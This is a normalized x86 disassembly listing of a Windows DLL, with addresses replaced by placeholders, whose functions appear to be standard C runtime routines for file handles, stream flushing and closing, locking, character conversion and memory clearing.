call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c92
and [ eax ] 0x0
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c2d
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_100148e5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_1001a03e
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c92
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_1001908f
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10019858
mov eax [ ebp - 0x1c ]
sub_10019860
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_100144c6
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_100198a9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c2d
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_10019905
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_1001450b
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_1001450b
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_100199d6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_10017bb6
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_10019a17
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_10017bb6
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_10019a49
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_10017add
pop ecx
pop ebp
retn
sub_10019a85
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_10017add
pop ecx
pop ebp
retn
sub_10019ab4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
or eax 0xffffffff
pop ebp
retn
sub_10019af0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_10013009
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_10015c7f
push 0x16
pop esi
mov [ eax ] esi
call sub_10015c2d
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_10015c7f
mov [ eax ] 0x2a
call sub_10015c7f
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_10015c7f
push 0x22
pop esi
mov [ eax ] esi
call sub_10015c2d
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_10018220
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_10018220
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10019c62
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10013009
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_10019d00
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10019d20
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10012771
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_10019d65
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10019d65
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_10019d20
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10019e15
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10019e34
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_10019e0c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10019e15
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10019e40
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_10019efa
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_10019f4f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c92
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10019fd5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_10015c92
and [ eax ] 0x0
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c92
and [ eax ] 0x0
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c2d
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_1001a03e
push 0xc
push r--data
call sub_100148a0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_10017bb6
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_100148e5
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a0d4
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_1001a0dd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1001a104
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_1001a4da
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_1001a146
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10013009
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_10018acc
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_10015c7f
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_1001a280
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_1001a2ab
push 0x10
push r--data
call sub_100148a0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_10017bb6
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a33e
mov eax [ ebp - 0x1c ]
call sub_100148e5
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_1001a57d
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_100134fd
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_1001a347
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_10019ab4
pop ecx
push eax
call sub_1001978c
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_1001a3af
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_1001a347
pop ecx
test eax eax
je r-xdata
push esi
call sub_1001a3f7
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_10019ab4
push eax
call sub_1001a5f1
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_1001a3f7
push 0x14
push r--data
call sub_100148a0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_10017bb6
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a4c8
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_100148e5
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_10019a17
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_1001a499
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_1001a3af
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_1001a3af
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_1001a510
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_1001a347
push esi
mov edi eax
call sub_1001a82a
push esi
call sub_10019ab4
push eax
call sub_1001a766
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_100134fd
and [ esi + 0x1c ] 0x0
pop ecx
sub_1001a57d
push 0xc
push r--data
call sub_100148a0
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
or eax 0xffffffff
jmp r-xdata
push esi
call sub_100199d6
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1001a510
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a5e9
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_100148e5
retn
mov eax [ ebp - 0x1c ]
sub_1001a5f1
push 0x10
push r--data
call sub_100148a0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c2d
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_100148e5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_1001a03e
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_10015c7f
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_10019fd5
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a6c2
mov eax [ ebp - 0x1c ]
call sub_10015c92
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_1001a6ca
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10019fd5
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_10015ca5
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_10019fd5
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_10019fd5
push 0x1
mov edi eax
call sub_10019fd5
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_10019f4f
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_1001a766
push 0x10
push r--data
call sub_100148a0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_10015c92
and [ eax ] 0x0
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c92
and [ eax ] 0x0
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c2d
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_100148e5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_1001a03e
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10015c7f
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_1001a6ca
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a822
mov eax [ ebp - 0x1c ]
sub_1001a82a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_100134fd
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_1001a862
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10013009
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
push esi
jne r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001aa5d
movzx esi ax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
add ebx 0x2
call sub_1001aa5d
add esp 0x10
add edi 0x2
movzx eax ax
test si si
je r-xdata
sub ebx edi
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
cmp si ax
je r-xdata
mov esi eax
cmp eax 0x5a
ja r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
add edi 0x2
test si si
je r-xdata
